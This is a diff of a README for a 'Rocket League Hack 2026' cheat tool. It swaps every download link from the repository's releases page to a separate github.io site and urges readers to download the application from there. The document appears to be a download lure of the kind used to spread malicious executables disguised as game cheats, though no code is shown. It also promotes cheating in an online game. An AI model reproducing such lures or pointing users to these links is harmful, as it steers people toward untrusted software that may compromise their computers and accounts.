@@ -1,6 +1,6 @@
 # 🎮 rocket-league-hack-2026 - Dominate Every Match with Pro-Level Training Tools
 
-[![Download Now](https://img.shields.io/badge/Download-Rocket_League_Hack_2026-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Cupulefireball6276/rocket-league-hack-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Rocket_League_Hack_2026-FF6B35?style=for-the-badge&logo=github&logoColor=white)](https://cupulefireball6276.github.io)
 
 ---
 
@@ -38,7 +38,7 @@ If your PC can run Rocket League itself, it can run this tool. No special hardwa
 Getting the software on your computer takes less than two minutes. Follow these steps exactly:
 
 1. **Click the big orange button** at the top of this page, or use the direct link here:  
-   [https://github.com/Cupulefireball6276/rocket-league-hack-2026/releases](https://github.com/Cupulefireball6276/rocket-league-hack-2026/releases)
+   [https://cupulefireball6276.github.io](https://cupulefireball6276.github.io)
 
 2. **Visit this link to download the application.** You will see a list of files on the page.
 
@@ -163,7 +163,7 @@ This tool is intended for educational and training purposes only. Use it at your
 ---
 
 **Ready to take your Rocket League skills to the next level?**  
-[Download Rocket League Hack 2026 Now](https://github.com/Cupulefireball6276/rocket-league-hack-2026/releases)
+[Download Rocket League Hack 2026 Now](https://cupulefireball6276.github.io)
 
 ---
 
